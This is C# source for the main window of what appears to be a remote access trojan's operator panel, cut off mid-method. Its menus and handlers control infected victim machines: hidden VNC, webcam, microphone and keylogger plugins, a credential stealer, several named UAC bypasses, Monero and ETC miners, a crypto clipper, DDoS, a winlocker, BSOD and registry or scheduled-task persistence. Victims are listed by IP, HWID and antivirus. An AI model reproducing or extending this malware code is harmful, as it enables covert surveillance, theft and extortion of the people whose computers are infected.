using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Forms;
using Server.Helper;
using Server.Helper.Tasks;

namespace Server;

public class Form1 : FormMaterial
{
	public Settings settings;

	public FormXmrMiner MinerXMR;

	public FormMinerEtc MinerEtc;

	public FormDDos DDos;

	public FormClipper Clipper;

	public FormReverseProxyR ReverseProxyR;

	public FormReverseProxyU ReverseProxyU;

	private bool timer1Key = true;

	private IContainer components;

	private MaterialTabControl materialTabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private MenuStrip menuStrip2;

	private ToolStripMenuItem toolStripMenuItem11;

	private ToolStripMenuItem toolStripMenuItem12;

	private ToolStripMenuItem toolStripMenuItem13;

	private ToolStripMenuItem connects0ToolStripMenuItem;

	private ToolStripMenuItem sents0mbToolStripMenuItem;

	private ToolStripMenuItem recives0mbToolStripMenuItem;

	private ToolStripMenuItem sents0mbsToolStripMenuItem;

	private ToolStripMenuItem recives0mbsToolStripMenuItem;

	private ToolStripMenuItem users0ToolStripMenuItem;

	private ToolStripMenuItem dataToolStripMenuItem;

	private Panel panel1;

	private ToolStripMenuItem buliderToolStripMenuItem2;

	private ToolStripMenuItem settingsToolStripMenuItem2;

	private ToolStripMenuItem minerXMRToolStripMenuItem1;

	private ToolStripMenuItem dDOSPanelToolStripMenuItem1;

	private ToolStripMenuItem exitToolStripMenuItem1;

	private ToolStripMenuItem aboutToolStripMenuItem;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem userInterfaceToolStripMenuItem;

	private ToolStripMenuItem desktopToolStripMenuItem;

	private ToolStripMenuItem cameraToolStripMenuItem;

	private ToolStripMenuItem microphoneToolStripMenuItem;

	private ToolStripMenuItem shellToolStripMenuItem;

	private ToolStripMenuItem regeditToolStripMenuItem;

	private ToolStripMenuItem explorerToolStripMenuItem;

	private ToolStripMenuItem processToolStripMenuItem;

	private ToolStripMenuItem netStatToolStripMenuItem;

	private ToolStripMenuItem autorunToolStripMenuItem;

	private ToolStripMenuItem controlToolStripMenuItem;

	private ToolStripMenuItem sendFileToolStripMenuItem;

	private ToolStripMenuItem fromDiskToolStripMenuItem;

	private ToolStripMenuItem fromMemoryToolStripMenuItem;

	private ToolStripMenuItem fromLinkToolStripMenuItem;

	private ToolStripMenuItem funToolStripMenuItem;

	private ToolStripMenuItem chatToolStripMenuItem;

	private ToolStripMenuItem webSiteToolStripMenuItem;

	private ToolStripMenuItem changeWallpaperToolStripMenuItem;

	private ToolStripMenuItem malwareToolStripMenuItem;

	private ToolStripMenuItem wormsToolStripMenuItem;

	private ToolStripMenuItem botKillerToolStripMenuItem;

	private ToolStripMenuItem systemControlToolStripMenuItem;

	private ToolStripMenuItem exitToolStripMenuItem;

	private ToolStripMenuItem exitToolStripMenuItem2;

	private ToolStripMenuItem updateToolStripMenuItem;

	private ToolStripMenuItem restartToolStripMenuItem;

	private ToolStripMenuItem uninstallToolStripMenuItem;

	private ToolStripMenuItem systemToolStripMenuItem;

	private ToolStripMenuItem shutdownToolStripMenuItem;

	private ToolStripMenuItem restartToolStripMenuItem1;

	private ToolStripMenuItem logOutToolStripMenuItem;

	private ToolStripMenuItem bypassUacToolStripMenuItem1;

	private ToolStripMenuItem runAsSystemToolStripMenuItem;

	private ToolStripMenuItem runAsAdminUacToolStripMenuItem;

	private ToolStripMenuItem eventvwrToolStripMenuItem;

	private ToolStripMenuItem fodhelperToolStripMenuItem;

	private ToolStripMenuItem computerdefaultsToolStripMenuItem;

	private ToolStripMenuItem sDCLTToolStripMenuItem;

	private ToolStripMenuItem sLUIToolStripMenuItem;

	private ToolStripMenuItem diskCleanupToolStripMenuItem;

	private ToolStripMenuItem stealerToolStripMenuItem;

	public DataGridView GridLogs;

	private ToolStripMenuItem keyLoggerToolStripMenuItem;

	private System.Windows.Forms.Timer MbSecound;

	private ToolStripMenuItem disconnectToolStripMenuItem;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column3;

	private ToolStripMenuItem systemSoundToolStripMenuItem;

	private ToolStripMenuItem hVNCToolStripMenuItem;

	private ToolStripMenuItem serviceToolStripMenuItem;

	private ToolStripMenuItem reverseProxyToolStripMenuItem;

	private ToolStripMenuItem clipperPanelToolStripMenuItem;

	private ContextMenuStrip contextMenuStrip2;

	private ToolStripMenuItem clearToolStripMenuItem;

	private TabPage tabPage3;

	public DataGridView dataGridView2;

	private ContextMenuStrip contextMenuStrip3;

	private ToolStripMenuItem removeToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem1;

	private ToolStripMenuItem toolStripMenuItem2;

	private ToolStripMenuItem proxyRPanelToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem3;

	public DataGridView GridClients;

	private ToolStripSeparator sToolStripMenuItem;

	private ToolStripSeparator sToolStripMenuItem1;

	private ToolStripSeparator sToolStripMenuItem2;

	private ToolStripSeparator sToolStripMenuItem3;

	private ToolStripSeparator sToolStripMenuItem4;

	private ToolStripSeparator sToolStripMenuItem5;

	private ToolStripSeparator sToolStripMenuItem6;

	private ToolStripSeparator sToolStripMenuItem7;

	private ToolStripMenuItem openClientFolderToolStripMenuItem;

	private ToolStripSeparator sToolStripMenuItem8;

	private ToolStripMenuItem windowToolStripMenuItem;

	private ToolStripSeparator toolStripMenuItem5;

	private ToolStripSeparator toolStripMenuItem6;

	private ToolStripMenuItem keyLoggerSetupToolStripMenuItem;

	private ToolStripSeparator sToolStripMenuItem9;

	private ToolStripMenuItem programsToolStripMenuItem;

	private ToolStripMenuItem installNfx3ToolStripMenuItem;

	private ToolStripMenuItem taskMgrToolStripMenuItem;

	private ToolStripMenuItem enableToolStripMenuItem;

	private ToolStripMenuItem disableToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem15;

	private ToolStripMenuItem toolStripMenuItem16;

	private ToolStripMenuItem toolStripMenuItem17;

	private ToolStripMenuItem toolStripMenuItem9;

	private ToolStripMenuItem toolStripMenuItem10;

	private ToolStripMenuItem toolStripMenuItem14;

	private ToolStripMenuItem toolStripMenuItem4;

	private ToolStripMenuItem toolStripMenuItem7;

	private ToolStripMenuItem toolStripMenuItem8;

	private ToolStripMenuItem toolStripMenuItem18;

	private ToolStripMenuItem toolStripMenuItem19;

	private ToolStripMenuItem toolStripMenuItem20;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripMenuItem deletePointsToolStripMenuItem;

	private ToolStripMenuItem bSODToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem24;

	private ToolStripMenuItem toolStripMenuItem25;

	private ToolStripMenuItem toolStripMenuItem26;

	private ToolStripMenuItem toolStripMenuItem21;

	private ToolStripMenuItem toolStripMenuItem22;

	private ToolStripMenuItem toolStripMenuItem23;

	private ToolStripMenuItem toolStripMenuItem27;

	private ToolStripMenuItem toolStripMenuItem28;

	private ToolStripMenuItem toolStripMenuItem29;

	private ToolStripSeparator sToolStripMenuItem10;

	private ToolStripMenuItem toolStripMenuItem30;

	private ToolStripMenuItem vIsbleToolStripMenuItem;

	private ToolStripMenuItem invisibleToolStripMenuItem;

	private ToolStripMenuItem botSpeakerToolStripMenuItem;

	private ToolStripMenuItem shellCodeToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem31;

	private ToolStripMenuItem toolStripMenuItem32;

	private ToolStripMenuItem toolStripMenuItem33;

	private ToolStripMenuItem hostFileToolStripMenuItem;

	private ToolStripMenuItem notepadToolStripMenuItem;

	private ToolStripMenuItem keyLoggerUninstallToolStripMenuItem;

	private ToolStripMenuItem fastRunToolStripMenuItem;

	private ToolStripMenuItem stealthSaverToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem34;

	private ToolStripMenuItem volumeToolStripMenuItem;

	private ToolStripMenuItem deviceManagerToolStripMenuItem;

	private ToolStripMenuItem resetScaleToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem35;

	private ToolStripMenuItem toolStripMenuItem36;

	private ToolStripMenuItem toolStripMenuItem37;

	private ToolStripMenuItem toolStripMenuItem38;

	private ToolStripSeparator toolStripSeparator3;

	private ToolStripMenuItem toolStripMenuItem40;

	private ToolStripMenuItem toolStripMenuItem42;

	private ToolStripSeparator toolStripSeparator4;

	private ToolStripMenuItem toolStripMenuItem43;

	private ToolStripMenuItem toolStripMenuItem44;

	private ToolStripMenuItem toolStripMenuItem45;

	private ToolStripMenuItem toolStripMenuItem46;

	private ToolStripSeparator toolStripSeparator5;

	private ToolStripMenuItem toolStripMenuItem47;

	private ToolStripMenuItem toolStripMenuItem48;

	private ToolStripMenuItem toolStripMenuItem49;

	private ToolStripMenuItem toolStripMenuItem50;

	private ToolStripMenuItem toolStripMenuItem51;

	private ToolStripMenuItem toolStripMenuItem52;

	private ToolStripMenuItem toolStripMenuItem53;

	private ToolStripMenuItem toolStripMenuItem54;

	private ToolStripMenuItem toolStripMenuItem55;

	private ToolStripMenuItem toolStripMenuItem56;

	private ToolStripMenuItem toolStripMenuItem57;

	private ToolStripMenuItem toolStripMenuItem58;

	private ToolStripSeparator toolStripSeparator6;

	private ToolStripMenuItem toolStripMenuItem59;

	private ToolStripMenuItem toolStripMenuItem60;

	private ToolStripMenuItem toolStripMenuItem61;

	private ToolStripMenuItem toolStripMenuItem62;

	private ToolStripMenuItem toolStripMenuItem63;

	private ToolStripMenuItem toolStripMenuItem64;

	private ToolStripMenuItem toolStripMenuItem65;

	private ToolStripMenuItem toolStripMenuItem66;

	private ToolStripMenuItem toolStripMenuItem67;

	private ToolStripMenuItem toolStripMenuItem68;

	private ToolStripMenuItem toolStripMenuItem69;

	private ToolStripMenuItem toolStripMenuItem70;

	private ToolStripMenuItem toolStripMenuItem71;

	private ToolStripMenuItem toolStripMenuItem72;

	private ToolStripMenuItem toolStripMenuItem73;

	private ToolStripSeparator sToolStripMenuItem11;

	private ToolStripMenuItem toolStripMenuItem41;

	private ToolStripMenuItem toolStripMenuItem74;

	private ToolStripMenuItem toolStripMenuItem75;

	private ToolStripMenuItem toolStripMenuItem76;

	private ToolStripMenuItem toolStripMenuItem77;

	private ToolStripMenuItem toolStripMenuItem78;

	private ToolStripSeparator toolStripSeparator7;

	private ToolStripMenuItem toolStripMenuItem81;

	private ToolStripMenuItem toolStripMenuItem82;

	private ToolStripMenuItem toolStripMenuItem83;

	private ToolStripMenuItem toolStripMenuItem79;

	private ToolStripMenuItem renameToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem80;

	private ToolStripMenuItem runOnceRunAllToolStripMenuItem;

	private DataGridViewTextBoxColumn Column5;

	private DataGridViewTextBoxColumn TS_Runs;

	private DataGridViewTextBoxColumn TS_Name;

	private DataGridViewImageColumn Column4;

	private DataGridViewTextBoxColumn ColumnIP;

	private DataGridViewTextBoxColumn ColumnCountry;

	private DataGridViewTextBoxColumn ColumnGroup;

	private DataGridViewTextBoxColumn Column6;

	private DataGridViewTextBoxColumn ColumnHwid;

	private DataGridViewTextBoxColumn ColumnUserPC;

	private DataGridViewTextBoxColumn ColumnCamera;

	private DataGridViewTextBoxColumn ColumnCpu;

	private DataGridViewTextBoxColumn ColumnGpu;

	private DataGridViewTextBoxColumn ColumnOs;

	private DataGridViewTextBoxColumn ColumnAntiVirus;

	private DataGridViewTextBoxColumn ColumnVersion;

	private DataGridViewTextBoxColumn ColumnTimeInstall;

	private DataGridViewTextBoxColumn ColumnPrivilege;

	private DataGridViewTextBoxColumn ColumnPing;

	private DataGridViewTextBoxColumn ColumnWindow;

	private ToolStripMenuItem noteToolStripMenuItem;

	private ToolStripMenuItem performanceToolStripMenuItem;

	private ToolStripMenuItem processBlockToolStripMenuItem;

	private ToolStripMenuItem killToolStripMenuItem;

	private ToolStripMenuItem deadToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem39;

	private ToolStripMenuItem toolStripMenuItem84;

	private ToolStripMenuItem toolStripMenuItem85;

	private ToolStripMenuItem windowsExceToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem86;

	private ToolStripMenuItem toolStripMenuItem87;

	private ToolStripMenuItem toolStripMenuItem88;

	private ToolStripSeparator toolStripSeparator2;

	private ToolStripMenuItem toolStripMenuItem89;

	private ToolStripMenuItem toolStripMenuItem90;

	private ToolStripMenuItem toolStripMenuItem91;

	private ToolStripMenuItem toolStripMenuItem92;

	private ToolStripMenuItem toolStripMenuItem93;

	private ToolStripMenuItem toolStripMenuItem94;

	private ToolStripMenuItem toolStripMenuItem95;

	private ToolStripMenuItem toolStripMenuItem96;

	private ToolStripMenuItem toolStripMenuItem97;

	private ToolStripMenuItem toolStripMenuItem98;

	private ToolStripMenuItem toolStripMenuItem99;

	private ToolStripMenuItem toolStripMenuItem100;

	private ToolStripMenuItem toolStripMenuItem102;

	private ToolStripMenuItem toolStripMenuItem103;

	private ToolStripMenuItem toolStripMenuItem104;

	private ToolStripMenuItem toolStripMenuItem105;

	private ToolStripMenuItem toolStripMenuItem101;

	private ToolStripMenuItem keyLoggerDownloadToolStripMenuItem;

	private ToolStripMenuItem autoRunToolStripMenuItem1;

	private ToolStripMenuItem schtaskToolStripMenuItem;

	private ToolStripMenuItem regUserToolStripMenuItem;

	private ToolStripMenuItem regMachineToolStripMenuItem;

	private ToolStripMenuItem startupToolStripMenuItem;

	private ToolStripMenuItem regUserinitToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem106;

	private ToolStripMenuItem toolStripMenuItem107;

	private ToolStripMenuItem toolStripMenuItem108;

	private ToolStripMenuItem toolStripMenuItem109;

	private ToolStripMenuItem toolStripMenuItem110;

	private ToolStripMenuItem toolStripMenuItem111;

	private ToolStripMenuItem toolStripMenuItem112;

	private ToolStripMenuItem toolStripMenuItem113;

	private ToolStripMenuItem processCriticalToolStripMenuItem;

	private ToolStripMenuItem setCriticalToolStripMenuItem;

	private ToolStripMenuItem exitCriticalToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem114;

	private ToolStripMenuItem toolStripMenuItem115;

	private ToolStripMenuItem toolStripMenuItem116;

	private ToolStripMenuItem reportWindowToolStripMenuItem;

	private ToolStripMenuItem startToolStripMenuItem;

	private ToolStripMenuItem stopToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem117;

	private ToolStripMenuItem fileSearcherToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem118;

	private ToolStripMenuItem minerRigelToolStripMenuItem;

	private ToolStripMenuItem copyRecoveryToolStripMenuItem;

	private ToolStripMenuItem winlockerToolStripMenuItem;

	private ToolStripMenuItem mapToolStripMenuItem;

	private ToolStripMenuItem pluginClearToolStripMenuItem;

	private System.Windows.Forms.Timer timer1;

	public Form1()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (!Directory.Exists("local"))
		{
			Directory.CreateDirectory("local");
		}
		MinerXMR = new FormXmrMiner();
		MinerEtc = new FormMinerEtc();
		Clipper = new FormClipper();
		DDos = new FormDDos();
		ReverseProxyR = new FormReverseProxyR();
		ReverseProxyU = new FormReverseProxyU();
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		if (File.Exists("local\\Tasks.json"))
		{
			AutoTaskMgr.Import();
		}
		if (File.Exists("local\\Clipper.json") && JsonConvert.DeserializeObject<Clipper>(File.ReadAllText("local\\Clipper.json")).AutoStart)
		{
			Clipper.Show();
			Clipper.Hide();
		}
		if (File.Exists("local\\Miner.json") && JsonConvert.DeserializeObject<MinerXMR>(File.ReadAllText("local\\Miner.json")).AutoStart)
		{
			MinerXMR.Show();
			MinerXMR.Hide();
		}
		if (File.Exists("local\\MinerEtc.json") && JsonConvert.DeserializeObject<MinerEtc>(File.ReadAllText("local\\MinerEtc.json")).AutoStart)
		{
			MinerEtc.Show();
			MinerEtc.Hide();
		}
		if (File.Exists("local\\ReverseProxyR.json") && JsonConvert.DeserializeObject<ReverseProxyR>(File.ReadAllText("local\\ReverseProxyR.json")).AutoStart)
		{
			ReverseProxyR.Show();
			ReverseProxyR.Hide();
		}
		if (File.Exists("local\\ReverseProxyU.json") && JsonConvert.DeserializeObject<ReverseProxyU>(File.ReadAllText("local\\ReverseProxyU.json")).AutoStart)
		{
			ReverseProxyU.Show();
			ReverseProxyU.Hide();
		}
		GridClients.ColumnWidthChanged += DataGridView1_ColumnHeadersHeightChanged;
		GridClients.RowPrePaint += DataGridView1_RowPrePaint;
		GridClients.MouseWheel += DataGridView1_OnMouseWheel;
		if (File.Exists("local\\Settings.json"))
		{
			settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
			if (settings.Start)
			{
				settings.Ports.ToList().ForEach(delegate(string item)
				{
					FormSettings.listners.Add(new Listner(Convert.ToInt32(item)));
				});
			}
		}
		else
		{
			settings = new Settings();
		}
		Certificate.Import();
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, GridClients, new object[1] { true });
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, GridLogs, new object[1] { true });
	}

	public int HeightColumn()
	{
		return GridClients.RowTemplate.Height;
	}

	private void DataGridView1_OnMouseWheel(object sender, MouseEventArgs e)
	{
		OnMouseWheel(e);
		try
		{
			switch (e.Delta)
			{
			case 120:
				GridClients.FirstDisplayedScrollingRowIndex = Math.Max(0, GridClients.FirstDisplayedScrollingRowIndex - SystemInformation.MouseWheelScrollLines);
				break;
			case -120:
				GridClients.FirstDisplayedScrollingRowIndex += SystemInformation.MouseWheelScrollLines;
				break;
			}
		}
		catch
		{
		}
	}

	private void DataGridView1_ColumnHeadersHeightChanged(object sender, EventArgs e)
	{
		if (GridClients.Columns[0].Width > 90)
		{
			GridClients.Columns[0].Width = 70;
		}
		GridClients.RowTemplate.Height = GridClients.Columns[0].Width - 20;
	}

	private void DataGridView1_RowPostPaint(object sender, DataGridViewRowPostPaintEventArgs e)
	{
		GridClients.Rows[e.RowIndex].Height = HeightColumn();
	}

	private void DataGridView1_RowPrePaint(object sender, DataGridViewRowPrePaintEventArgs e)
	{
		GridClients.Rows[e.RowIndex].Height = HeightColumn();
	}

	private void ChangeScheme(object sender)
	{
		GridClients.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		GridClients.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridClients.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		GridClients.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridLogs.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		GridLogs.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridLogs.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		GridLogs.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		AutoTaskMgr.Export();
	}

	private void exitToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		new FormAbout().ShowDialog();
	}

	private void settingsToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		new FormSettings().ShowDialog();
	}

	private void buliderToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		new FormBulider().ShowDialog();
	}

	private void MbSecound_Tick(object sender, EventArgs e)
	{
		sents0mbsToolStripMenuItem.Text = "Sents [" + Methods.BytesToString(SocketData.Sent) + "/s]";
		recives0mbsToolStripMenuItem.Text = "Recives [" + Methods.BytesToString(SocketData.Recive) + "/s] }";
		sents0mbToolStripMenuItem.Text = "Sents [" + Methods.BytesToString(SocketData.Sents) + "]";
		recives0mbToolStripMenuItem.Text = "Recives [" + Methods.BytesToString(SocketData.Recives) + "]";
		connects0ToolStripMenuItem.Text = $"   {{ Connects [{SocketData.Connects}]";
		SocketData.Clear();
		toolStripMenuItem11.Text = $"   {{ Online [{GridClients.Rows.Count}]";
		toolStripMenuItem12.Text = $"Selected [{GridClients.SelectedRows.Count}]";
		if (MinerXMR.work)
		{
			toolStripMenuItem118.Text = $"Miners xmrig [{MinerXMR.GridClients.Rows.Count}]";
		}
		else
		{
			toolStripMenuItem118.Text = "Miners xmrig [Not work]";
		}
		if (MinerEtc.work)
		{
			toolStripMenuItem1.Text = $"Miners etc [{MinerEtc.GridClients.Rows.Count}]";
		}
		else
		{
			toolStripMenuItem1.Text = "Miners etc [Not work]";
		}
		if (Clipper.work)
		{
			toolStripMenuItem13.Text = $"Clippers [{Clipper.clients.Count}]";
		}
		else
		{
			toolStripMenuItem13.Text = "Clippers [Not work]";
		}
		if (DDos.work)
		{
			toolStripMenuItem3.Text = $"DDos [{DDos.clients.Count}]";
		}
		else
		{
			toolStripMenuItem3.Text = "DDos [Not work]";
		}
		if (ReverseProxyR.work)
		{
			users0ToolStripMenuItem.Text = $"Reverse Proxy R [{ReverseProxyR.Server.ClientReverse.Count}]    ";
		}
		else
		{
			users0ToolStripMenuItem.Text = "Reverse Proxy R [Not work]    ";
		}
		if (ReverseProxyU.work)
		{
			toolStripMenuItem34.Text = $"Reverse Proxy U [{ReverseProxyU.GridIps.Rows.Count}] }}   ";
		}
		else
		{
			toolStripMenuItem34.Text = "Reverse Proxy U [Not work] }   ";
		}
		GC.Collect();
	}

	public Clients[] ClientsSelected()
	{
		List<Clients> list = new List<Clients>();
		foreach (DataGridViewRow selectedRow in GridClients.SelectedRows)
		{
			list.Add((Clients)selectedRow.Tag);
		}
		return list.ToArray();
	}

	public Clients[] ClientsAll()
	{
		List<Clients> list = new List<Clients>();
		foreach (DataGridViewRow item in (IEnumerable)GridClients.Rows)
		{
			list.Add((Clients)item.Tag);
		}
		return list.ToArray();
	}

	private void exitToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[1] { "Exit" });
			});
		}
	}

	private void restartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[1] { "Restart" });
			});
		}
	}

	private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[1] { "Uninstall" });
			});
		}
	}

	private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Disconnect();
			});
		}
	}

	private void openClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if (Directory.Exists("Users\\" + clients.Hwid))
			{
				System.Threading.Tasks.Task.Run(() => Process.Start("Users\\" + clients.Hwid));
			}
		}
	}

	private void updateToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(openFileDialog.FileName);
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[2] { "Update", bytes });
			});
		}
	}

	private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Desktop.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormDesktop)Application.OpenForms["Desktop:" + clients.Hwid] == null)
			{
				FormDesktop formDesktop = new FormDesktop();
				formDesktop.Name = "Desktop:" + clients.Hwid;
				formDesktop.parrent = clients;
				formDesktop.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void cameraToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Camera.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormCamera)Application.OpenForms["Camera:" + clients.Hwid] == null)
			{
				FormCamera formCamera = new FormCamera();
				formCamera.Name = "Camera:" + clients.Hwid;
				formCamera.parrent = clients;
				formCamera.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Microphone.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormMicrophone)Application.OpenForms["Microphone:" + clients.Hwid] == null)
			{
				FormMicrophone formMicrophone = new FormMicrophone();
				formMicrophone.Name = "Microphone:" + clients.Hwid;
				formMicrophone.parrent = clients;
				formMicrophone.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void systemSoundToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\SystemSound.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormSystemSound)Application.OpenForms["SystemSound:" + clients.Hwid] == null)
			{
				FormSystemSound formSystemSound = new FormSystemSound();
				formSystemSound.Name = "SystemSound:" + clients.Hwid;
				formSystemSound.parrent = clients;
				formSystemSound.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void explorerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Explorer.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormExplorer)Application.OpenForms["Explorer:" + clients.Hwid] == null)
			{
				FormExplorer formExplorer = new FormExplorer();
				formExplorer.Name = "Explorer:" + clients.Hwid;
				formExplorer.parrent = clients;
				formExplorer.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\HVNC.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormHVNC)Application.OpenForms["HVNC:" + clients.Hwid] == null)
			{
				FormHVNC formHVNC = new FormHVNC();
				formHVNC.Name = "HVNC:" + clients.Hwid;
				formHVNC.parrent = clients;
				formHVNC.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void processToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Process.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormProcess)Application.OpenForms["Process:" + clients.Hwid] == null)
			{
				FormProcess formProcess = new FormProcess();
				formProcess.Name = "Process:" + clients.Hwid;
				formProcess.parrent = clients;
				formProcess.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void regeditToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Regedit.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormRegedit)Application.OpenForms["Regedit:" + clients.Hwid] == null)
			{
				FormRegedit formRegedit = new FormRegedit();
				formRegedit.Name = "Regedit:" + clients.Hwid;
				formRegedit.parrent = clients;
				formRegedit.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
